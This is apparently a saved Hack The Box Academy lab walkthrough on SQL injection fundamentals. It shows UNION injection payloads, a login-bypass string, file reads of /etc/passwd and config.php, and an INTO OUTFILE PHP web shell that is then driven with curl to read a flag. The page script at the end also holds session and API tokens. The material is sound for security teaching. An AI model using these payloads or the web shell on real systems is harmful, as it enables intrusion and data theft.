<h3>"We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password."</h3>
<p>Students first need to know the current user that is executing the SQL queries in the backend server:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_14.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_14.png"></p>
<p>The user is <code>root</code>, which is an account that possess many privileges.</p>
<p>Students then will need to test if the current user has super admin privileges:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span> super_priv<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token keyword">FROM</span> mysql<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_15.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_15.png"></p>
<p><code>Y</code> denotes <code>YES</code>, thus, the current user has super admin privileges. Students then will need to enumerate other privileges that the current user has to check whether they can read files or not:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span> grantee<span class="token punctuation">,</span> privilege_type<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges<span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_16.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_16.png"></p>
<p>The <code>FILE</code> privilege is listed for the current user, thus, the current user can read files.</p>
<p>Since students can read files, they first need to load the "search.php" file and view its source code:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">"/var/www/html/search.php"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p>Students will notice that the "config.php" file is imported using the <code>include</code> command:</p>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_17.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_17.png"></p>
<p>Thus, at last, students need to load that file and find the flag as the value for <code>DB_PASSWORD</code>:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span>LOAD_FILE<span class="token punctuation">(</span><span class="token string">"/var/www/html/config.php"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_18.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_18.png"></p>
<p>Answer: {hidden}</p>
<h1>Writing Files</h1>
<h2>Question 1</h2>
<h3>"Find the flag by using a webshell."</h3>
<p>Students first need to check whether the current user they are executing queries as can read and write files to any directory on the backend server:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span> variable_name<span class="token punctuation">,</span> variable_value<span class="token punctuation">,</span> <span class="token number">4</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>global_variables <span class="token keyword">where</span> variable_name<span class="token operator">=</span><span class="token string">"secure_file_priv"</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_19.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_19.png"></p>
<p>Since the value for <code>SECURE_FILE_PRIV</code> is empty, the current user can read and write files to any directory. Thus, students then need to write a web shell to the web root folder to allow them to execute commands on the backend server:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">foo<span class="token string">' UNION SELECT "",'</span><span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token string">', "", "" INTO OUTFILE '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>shell<span class="token punctuation">.</span>php'<span class="token comment">-- -</span>
</code></pre></div></div>
<p>Once the web shell has been successfully written into the web root folder, students at last need to browse to the "shell.php" file and specify the command to be executed in the "cmd" parameter (which must be URL-encoded):</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell">http://STMIP:STMPO/shell.php?cmd<span class="token operator">=</span>cat%20<span class="token punctuation">..</span>/flag.txt
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_20.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_20.png"></p>
<p>Answer: {hidden}</p>
<h1>Skills Assessment - SQL Injection Fundamentals</h1>
<h2>Question 1</h2>
<h3>"Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer."</h3>
<p>After spawning the target machine, students need to navigate to its website's root page to find a login form:</p>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_21.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_21.png"></p>
<p>Since students do not have any credentials to login with, they need to subvert the query's logic with an OR injection to land inside the "Employee Dashboard" :</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">admin<span class="token string">' OR '</span><span class="token number">1</span><span class="token string">' = '</span><span class="token number">1</span>' <span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_22.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_22.png"></p>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_23.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_23.png"></p>
<p>Subsequently, students need to test whether the "SEARCH" field is vulnerable to SQL injections by providing a single apostrophe <code>'</code>,  which in turns returns a SQL error message: " You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1":</p>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_24.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_24.png"></p>
<p>Now that students are assured it is vulnerable, they need to utilize <code>UNION</code> injections to attempt reading files from the backend server. Students need to detect the number of columns selected by the backend server using either the <code>ORDER BY</code> method or the <code>UNION</code> method, the latter will be utilized. Students need to test <code>UNION</code> injection queries with a different number of columns until attaining a successful results back, i.e., not getting the error message "The used SELECT statements have a different number of columns". After trail and error, students will find that there are five columns in total, with the first column not being displayed:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_25.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_25.png"></p>
<p>Subsequently, students now need to determine the SQL user that is running the queries in the backend server:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_26.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_26.png"></p>
<p>Given that the user is <code>root</code>, it is very promising as this user is likely to be a DBA which posses many privileges. Thereafter, students need to enumerate all the privileges that the <code>root</code> user has, and whether they are granted to it or not:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span> grantee<span class="token punctuation">,</span> privilege_type<span class="token punctuation">,</span> is_grantable<span class="token punctuation">,</span> <span class="token number">5</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>user_privileges <span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_27.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_27.png"></p>
<p>With the <code>FILE</code> privilege granted to <code>root</code>, students can attempt to read the <code>/etc/passwd</code> file from the backend server using the <code>LOAD_FILE</code> function, injecting it in any column other than the first (the second column will be utilized):</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span> LOAD_FILE<span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_28.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_28.png"></p>
<p>Subsequently, students need to make sure that the MySQL global variable <code>secure_file_priv</code> is not enabled:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql">' <span class="token keyword">UNION</span> <span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span> variable_name<span class="token punctuation">,</span> variable_value<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span> <span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>global_variables <span class="token keyword">WHERE</span> variable_name<span class="token operator">=</span><span class="token string">"secure_file_priv"</span> <span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_29.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_29.png"></p>
<p>Since the value for the variable <code>SECURE_FILE_PRIV</code> is empty, the user <code>root</code> can read and write files to any directory in the entire file system. Therefore, students now need to write a PHP web shell <code>shell.php</code> using <code>INTO OUTFILE</code> to the directory <code>/var/www/html/dashboard/</code> (using the directory <code>/var/www/html/</code> instead will result in <code>Errcode: 13 "Permission Denied"</code>):</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">sql</span></div><pre class=" language-sql"><code class=" language-sql"><span class="token string">' UNION SELECT "",'</span><span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span>$_REQUEST<span class="token punctuation">[</span><span class="token string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">&gt;</span><span class="token string">', "", "", "" INTO OUTFILE '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>dashboard<span class="token operator">/</span>shell<span class="token punctuation">.</span>php'<span class="token comment">-- -</span>
</code></pre></div></div>
<p><img src="https://academy.hackthebox.com/storage/walkthroughs/31/SQL_Injection_Fundamentals_Walkthrough_Image_30.png" alt="SQL_Injection_Fundamentals_Walkthrough_Image_30.png"></p>
<p>With no error messages received, the web shell should be written to the backend server successfully. Therefore, students need to utilize <code>cURL</code> to invoke the web shell, passing commands to the URL parameter <code>cmd</code> (or any other parameter name chosen). First, students need to list all the files that are in the root directory <code>/</code> (deleting the first two lines, as they are unwanted), making sure to use <code>+</code> for the space character:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell"><span class="token function">curl</span> -w <span class="token string">"<span class="token entity" title="\n">\n</span>"</span> -s http://STMIP:STMPO/dashboard/shell.php?cmd<span class="token operator">=</span>ls+/ <span class="token operator">|</span> <span class="token function">sed</span> -e <span class="token string">'1,2d'</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Skills Assessment - SQL Injection Fundamentals</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-ubuyae6zow]─[~]
</span><span class="token info punctuation">└──╼ [★]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -w <span class="token string">"<span class="token entity" title="\n">\n</span>"</span> -s http://159.65.63.151:31872/dashboard/shell.php?cmd<span class="token operator">=</span>ls+/ <span class="token operator">|</span> <span class="token function">sed</span> -e <span class="token string">'1,2d'</span></span></span>
<span class="token output">	bin
boot
dev
etc
flag_cae1dadcd174.txt
home
lib
&lt;SNIP&gt;
</span></code></pre></div></div>
<p>From the output, students will know that the file is named <code>flag_cae1dadcd174.txt</code> and is under the root directory, thus, they need to print its contents out with <code>cat</code>, making sure to use <code>+</code> for the space character:</p>
<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">shell</span></div><pre class=" language-shell"><code class=" language-shell"><span class="token function">curl</span> -w <span class="token string">"<span class="token entity" title="\n">\n</span>"</span> -s http://STMIP:STMPO/dashboard/shell.php?cmd<span class="token operator">=</span>cat+/flag_cae1dadcd174.txt <span class="token operator">|</span> <span class="token function">sed</span> -e <span class="token string">'1,2d'</span>
</code></pre></div></div>
<div class="window_container"><div class="window_content">
                      <div class="window_top">
                          <span class="window_dot bg-danger"></span>
                          <span class="window_dot bg-warning"></span>
                          <span class="window_dot bg-success"></span>
                          <span class="window_title">Skills Assessment - SQL Injection Fundamentals</span>
                      </div>
                  <pre class=" language-shell-session" style="line-height: 0px;"><code class=" language-shell-session"><span class="token output">┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-ubuyae6zow]─[~]
</span><span class="token info punctuation">└──╼ [★]</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> -w <span class="token string">"<span class="token entity" title="\n">\n</span>"</span> -s http://159.65.63.151:31872/dashboard/shell.php?cmd<span class="token operator">=</span>cat+/flag_cae1dadcd174.txt <span class="token operator">|</span> <span class="token function">sed</span> -e <span class="token string">'1,2d'</span></span></span>

<span class="token output">	528d6d9cedc2c7aab146ef226e918396
</span></code></pre></div></div>
<p>Answer: {hidden}</p>

                </div>
            </div>
        </div>
    </div>
</div>


            </div>

            <footer class="footer">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-sm-6">

                        </div>
                        <div class="col-sm-6">
                            <div class="text-sm-right d-none d-sm-block">
                                Powered by &nbsp; <a href="https://www.hackthebox.com" target="_blank"><img style="margin-bottom: 1px;" src="/images/logo-htb.svg" height="20px" alt="Hack The Box logo"></a>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </div>

    </div>

</div>

<script src="/assets/libs/jquery/jquery.min.js"></script>

<link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/vue-radial-progress-a171cc18.css"><link rel="preload" as="style" href="https://academy.hackthebox.com/build/assets/app-1eef33f6.css"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/app-ff1fd518.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/lodash-c1890673.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-pusher-eb8f33cc.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-markdown-render-373cff4e.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-router-d40907bb.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vuex-25bbbfbe.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-radial-progress-faa564d7.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/popper-f4af5ef6.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vuejs-countdown-timer-c912f970.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue-screen-5ca5066c.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/vue2-perfect-scrollbar-dc6fc349.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/main-6ae9ad2c.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/just-detect-adblock-220f5df6.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/referral-6739fc5a.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/prism-1582e0e3.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/detectBrowser-fc4c37dc.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/core-helpers-aa8e1eb6.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/index-38146d66.js"><link rel="modulepreload" href="https://academy.hackthebox.com/build/assets/htbNote-5f4b4477.js"><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/vue-radial-progress-a171cc18.css"><link rel="stylesheet" href="https://academy.hackthebox.com/build/assets/app-1eef33f6.css"><script type="module" src="https://academy.hackthebox.com/build/assets/app-ff1fd518.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/main-6ae9ad2c.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/referral-6739fc5a.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/prism-1582e0e3.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/detectBrowser-fc4c37dc.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/core-helpers-aa8e1eb6.js"></script><script type="module" src="https://academy.hackthebox.com/build/assets/htbNote-5f4b4477.js"></script>
<script src="/assets/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="/assets/libs/simplebar/simplebar.min.js"></script>
<script src="/assets/libs/node-waves/waves.min.js"></script>
<script src="/assets/libs/toastr/toastr.min.js"></script>

<script>
    $(document).ready(function () {
        const csrfToken = 'NCvNHM6p2yXAC4ivrS5c20eqvDEScRMvGCtTZrEC';
        const apiToken = 'UzG36KEPFbQhsxnDpWpdkuDpuK99RWrLIBs4d5tcdZG2x3PI332NbFiULDZDYWW65GbujIdLvULzbThw';

        initAxios(csrfToken, apiToken);
    });

            $(document).ready(function () {
            const startEvent = new CustomEvent("HtbNote:InitializeNote", {
                detail: {
                    noteId: "6044ceb8-b4fe-47b8-8dfb-ed93e0335a78",
                    token: "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJIVEIgQWNhZGVteSIsInVzZXJfaWQiOiJwcm9kdWN0aW9uLTExNTk2NTciLCJyb2xlIjoidXNlciIsImlhdCI6MTc0Njg5MzM5OCwiZXhwIjoxNzQ2OTc5Nzk4fQ.sFm-_B2wGAcCQBwLzpsnFYF--OffpuW0U22EqFPNbT4"
                }
            });

            window.dispatchEvent(startEvent);
        });
    </script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap-select@1.13.14/dist/js/bootstrap-select.min.js"></script>
<script type="module">
    import {register} from '/assets/libs/core-web-components/index.js';

    register();
</script>

<script>
      let currentBrowser;
      let isPwnboxActive = false;
      let isTargetActive = false;
      let vmCheckTimer;
      let areSolutionsEnabled = false;
      const _showSolutionsSettingSwitch = $('#showSolutionsModuleSetting');
      const isAnnualUser = true;
      const isAdmin = false;
      const isCompanyAdmin = false;

      window.addEventListener('SpawnedPwnBox', () => {
          isPwnboxActive = true;
      }, false);

      window.addEventListener('TerminatedPwnBox', () => {
          isPwnboxActive = false;
      }, false);

      setTimeout(() => {
          currentBrowser = window.detectBrowser();
      }, 1000);

      const AXIOS_ERROR_HANDLING_MESSAGE = 'Something went wrong, please try again later.';

                setTimeout(() => {
              initReferralScheme();
          }, 1000);
      
      $('table').addClass('table table-striped text-left').wrap('<div class="table-responsive"></div>');

      $('.training-module a').attr('target', '_blank').attr('rel', 'noopener nofollow');

      $('.favouriteBtn').click(function () {
          let id = $(this).data('module-id');

          axios.get('/api/modules/favourite/' + id).then(response => {
              let data = response.data;
              if (data.fav === 1) {
            $(this).removeClass('fa-sharp fa-solid fa-regular').addClass('fa-sharp fa-solid');
                  toastr['success'](data.message, 'Success');
              } else {
            $(this).removeClass('fa-sharp fa-solid fa-regular').addClass('fa-regular');
                  toastr['success'](data.message, 'Success');
              }
          }).catch(err => {
              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
          });
      });

      function encode_utf8(string) {
          return unescape(encodeURIComponent(string));
      }

      function checkSolutionsSettings() {
        axios.get('/api/v2/user/settings/walkthroughs_enabled').then(response => {
            areSolutionsEnabled = response.data.data.value;

            if(areSolutionsEnabled) {
                _showSolutionsSettingSwitch.prop('checked', true);
            }
        }).catch(error => {
            toastr['error'](data.message, 'Error');
        });
      }

      function manageSolutionsSettings(enableWriteupSettings) {
        return axios.put('/api/v2/user/settings/walkthroughs_enabled', {
            value: enableWriteupSettings
        });
      }

      function handleSolutionPreferencesModalAction(enableWriteupSettings) {
        manageSolutionsSettings(!areSolutionsEnabled).then(response => {
            if (response.status === 204) {
                areSolutionsEnabled = enableWriteupSettings;
                if (areSolutionsEnabled) {
                    // refresh page to update UI
                    window.location.reload();
                }
            }
        }).catch(error => {
            toastr['error'](error.message, 'Error');
        }).finally(() => {
            $('#solutionPreferencesModal').modal('hide');
        });
      }

      _showSolutionsSettingSwitch.on('click', () => {
            if(isAnnualUser || isAdmin || isCompanyAdmin) {
                _showSolutionsSettingSwitch.prop('disabled', true);
                manageSolutionsSettings(!areSolutionsEnabled)
                    .then(response => {
                        if (response.status === 204) {
                            areSolutionsEnabled = !areSolutionsEnabled;
                             // refresh page to update UI
                             window.location.reload();
                        }
                    }).catch(error => {
                        toastr['error'](error.message, 'Error');
                    }).finally(() => {
                        // We add a small delay to avoid possible spam/abuse
                        setTimeout(() => {
                            _showSolutionsSettingSwitch.prop('disabled', false);
                        }, 1500);
                    });
            }
        });

      $('.btnAnswer').click(function () {
          let question_id = $(this).data('question-id');
          $(this).attr('disabled', 1);
          $(this).find('.submit-button-text').addClass('d-none');
          $(this).find('.submit-button-loader').removeClass('d-none');
          let utf8EncodedString = encode_utf8($('#answer' + question_id).val());
          axios.post('/api/check/answer', {
              answer: btoa(utf8EncodedString),
              question_id: question_id
          }).then(response => {
              let data = response.data;
              if (data.success === 0) {
                  $(this).removeAttr('disabled');

                  if(data.should_show_walkthrough_modal) {
                    openSolutionPreferencesModal();
                  }

                  toastr['error'](data.message, 'Error');
              } else {
                  $(this).attr('disabled', 1);
                  $('#answer' + question_id).attr('disabled', 1);
                  $('#answer' + question_id).addClass('text-success');
                  $('#hintBtn' + question_id).attr('disabled', 1);
                  $(`.d-discord-${question_id}`).addClass('d-none');
                  $('#questionStreakPointsText-' + question_id).addClass('d-none');
                  toastr['success'](data.message, 'Success');
                  completeCheck();
              }
              $(this).find('.submit-button-text').removeClass('d-none');
              $(this).find('.submit-button-loader').addClass('d-none');
          }).catch(err => {
              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
          });
      });

      $('.btnAnswerExercise').click(function () {
          let exercise_id = $(this).data('exercise-id');
          $(this).attr('disabled', 1);
          $(this).find('.submit-button-text').addClass('d-none');
          $(this).find('.submit-button-loader').removeClass('d-none');
          let utf8EncodedString = encode_utf8($(`#exerciseAnswer${exercise_id}`).val());
          axios.post(`/api/check/exercise/${exercise_id}/answer`, {
              answer: btoa(utf8EncodedString)
          }).then(response => {
              let data = response.data;
              if (data.success === 0) {
                  $(this).removeAttr('disabled');
                  toastr['error'](data.message, 'Error');
              } else {
                  $(this).attr('disabled', 1);
                  $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
                  $(`#exerciseAnswer${exercise_id}`).addClass('text-success');
                  toastr['success'](data.message, 'Success');
              }
              $(this).find('.submit-button-text').removeClass('d-none');
              $(this).find('.submit-button-loader').addClass('d-none');
          }).catch(err => {
              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
          });
      });

      $('.btnAnswerExerciseMultiple').click(function () {
          $(this).attr('disabled', 1);
          $(this).find('.submit-button-text').addClass('d-none');
          $(this).find('.submit-button-loader').removeClass('d-none');
          let exercise_id = $(this).data('exercise-id');
          $(this).attr('disabled', 1);
          let utf8EncodedString = $(`#exerciseAnswer${exercise_id}`).find('input:checked').val();
          axios.post(`/api/check/exercise/${exercise_id}/answer`, {
              answer: btoa(utf8EncodedString)
          }).then(response => {
              let data = response.data;
              if (data.success === 0) {
                  $(this).removeAttr('disabled');
                  toastr['error'](data.message, 'Error');
                  $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().parent().find(`.exercise-answer-justification`).removeClass('d-none');
                  $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).attr('disabled', 1);
                  $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().find('label').addClass('text-danger red');
              } else {
                  $(this).attr('disabled', 1);
                  $(`#exerciseAnswer${exercise_id}`).attr('disabled', 1);
                  $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().find('label').addClass('text-success green');
                  $(`#exerciseAnswer${exercise_id} input[type=radio]:checked`).parent().find('label').removeClass('red');
                  $(`#exerciseAnswer${exercise_id} input[type=radio]`).attr('disabled', 1);
                  $(`#exerciseAnswer${exercise_id} .exercise-answer-justification`).removeClass('d-none');
                  toastr['success'](data.message, 'Success');
              }
              $(this).find('.submit-button-text').removeClass('d-none');
              $(this).find('.submit-button-loader').addClass('d-none');
          }).catch(err => {
              toastr['error'](AXIOS_ERROR_HANDLING_MESSAGE, 'Error');
          });
      });

      $('.reveal-modal').click(e => {
          let id = $(e.target).data('exercise-id');
          $(`#revealExerciseAnswer${id}`).modal('hide');
      });

      $(document).ready(function () {
        let isOnOverloadedVpnServer;
        const overLoadedVpnServerStatusKey = 'htb-vpn-overloaded-status';
        isOnOverloadedVpnServer= '' ?? false;
        const isNotInformedForVpnLoad = JSON.parse(localStorage.getItem(overLoadedVpnServerStatusKey) === null);

        if(isOnOverloadedVpnServer && isNotInformedForVpnLoad) {
            $('#overloadedVpnInfoModal').modal('show');
        }

          setTimeout(() => {
            // we add a delay before calling this function
            // in order the axios headers to have been set
            completeCheck();
            checkSolutionsSettings();

          }, 500);

          setTimeout(() => {
            $('.bootstrap-select').find('button').attr("title","");
          }, 5000);

          $('pre').filter(function () {
              return this.className.match(/\blanguage-/);
          }).each(function () {
              let heading = $(this).prevAll().closest('h1').last().text();

              if (this.className === ' language-shell-session') {
                  wrapTerminal(this, heading);
              } else if (this.className === ' language-powershell-session') {
                  wrapPSTerminal(this, heading);
              } else if (this.className === ' language-cmd-session') {
                  wrapCMDTerminal(this, heading);
              } else if (this.className.startsWith(' language-')) {
                  var language = this.className.split('-').pop();
                  wrapCodeBlock(this, language);
              }
          });

          wrapBrowser($('.website-screenshot'));

          $('span:contains(\'[!bash!]\')').html('<span class="text-gray">hurusio@htb</span><span class="text-success">[/htb]</span>');

          let _vpnSelector = $('.vpnSelector');
          let _selectedServer = _vpnSelector.val();
          let _vpnLoader = $('.vpn-loader');

          let _vpnSwitchWarningModal = $('#vpnSwitchWarningModal');
          let _continueVpnSwitchBtn = $('#continueVpnSwitchBtn');
